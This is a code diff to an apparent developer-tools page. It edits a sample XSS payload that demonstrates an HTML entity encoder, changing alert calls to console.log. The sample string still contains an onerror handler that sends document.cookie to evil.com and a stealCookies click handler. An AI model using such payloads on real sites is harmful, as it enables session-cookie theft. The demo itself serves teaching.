@@ -1684,7 +1684,7 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
           };
 
           window.loadXssPayloadSample = function() {
-            var payload = '<div class="profile" data-user="admin\"><script>alert(document.domain)<\/script>\n<a href="javascript:alert(1)" onclick="stealCookies()">Click Me & Win $1,000!</a>\n<img src="x" onerror="fetch(\'https://evil.com/leak?\'+document.cookie)">';
+            var payload = '<div class="profile" data-user="admin\"><script>console.log(document.domain)<\/script>\n<a href="javascript:console.log(1)" onclick="stealCookies()">Click Me & Win $1,000!</a>\n<img src="x" onerror="fetch(\'https://evil.com/leak?\'+document.cookie)">';
             document.getElementById('ent-in').value = payload;
             entityTransform('named');
           };
